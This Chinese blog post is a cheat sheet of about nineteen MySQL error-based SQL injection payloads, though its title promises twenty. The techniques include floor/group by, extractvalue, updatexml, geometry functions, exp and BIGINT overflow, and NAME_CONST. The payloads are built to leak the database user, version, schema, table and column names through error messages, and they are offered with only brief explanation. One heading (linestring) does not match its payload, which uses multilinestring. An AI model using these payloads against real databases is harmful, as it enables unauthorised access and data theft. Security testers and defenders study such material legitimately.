---
title: SQL注入报错注入20种方式
date: 2023-08-27 15:29:03
tags:
- web漏洞
categories:
- web漏洞
---

# [mysql 二十余种报错注入姿势](https://www.cnblogs.com/feizianquan/p/10794681.html)

**1.floor()** 

floor 和group by 搭配使用 利用group by 的key唯一性 和mysql 编码执行顺序导致二次执行产生不同key

```
select * from users where id=1 OR+1e0GROUP BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2)) HAVING+MIN(0)OR+1
```

数值型注入时 不用闭合‘ 进行注入  利用 or 条件注入

通用型 的一般格式 注入

```
select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)
```

**2.extractvalue**

对XML文档进行查询的函数 和updatexml() 一样 针对5.5版本以后

```
select * from users where id=1 and extractvalue(1,concat(0x7e,user()))
```

**3.updatexml()**

```
select * from test where id=1 and updatexml(1,concat(0x7e,user()),1)
```

**4.geometrycollection()**

```
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
```

**5.multipoint()**

```
select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
```

**6.polygon()**

```
select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
```

**7.multipolygon()**

```
select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
```

**8.linestring()**

```
select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
```

**9.multilinestring()**

```
select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
```

**10.exp()**

`exp()`即为以e为底的对数函数

exp(709) 里面的参数在大于709时函数会报错

```
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
select * from test where id=1 and exp(~(select * from(select user())a));
```

**11.procedure analyse**

```
select * from  users order by 1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)
```

**12.用户变量**

```
select min(@a:=1) from information_schema.tables group by concat(database()
,@a:=(@a+1)%2)
```

**13.通过NAME_CONST(适用于低版本)**

```
+or+(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)
```

**14.0位取反报错 (BIGINT溢出)**

```
select ~0+!(select*from(select user())x);
```

**15.atan，ceil,floor,!,...相减溢出**

```
select !atan((select*from(select user())a))-~0; 
select !ceil((select*from(select user())a))-~0;
select !floor((select*from(select user())a))-~0;
select !HEX((select*from(select user())a))-~0; 
select !RAND((select*from(select user())a))-~0;
select !FLOOR((select*from(select user())a))-~0;
select !CEILING((select*from(select user())a))-~0; 
select !RAND((select*from(select user())a))-~0;
select !TAN((select*from(select user())a))-~0;
select !SQRT((select*from(select user())a))-~0; 
select !ROUND((select*from(select user())a))-~0;
select !SIGN((select*from(select user())a))-~0;
```

**16.@:=**

```
!(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
(select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
(select!x-~0.from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
```

**17.^ 按位异或**

```
select !(select*from(select user())a)-0^222;
```

**18.0位表减溢出**

```
(select(!x-~0)from(select(select user())x)a)

(select!x-~0.from(select(select user())x)a)
```

**19.in溢出**

```
select * from users where id in(~0+!(select*from(select user())x))
```
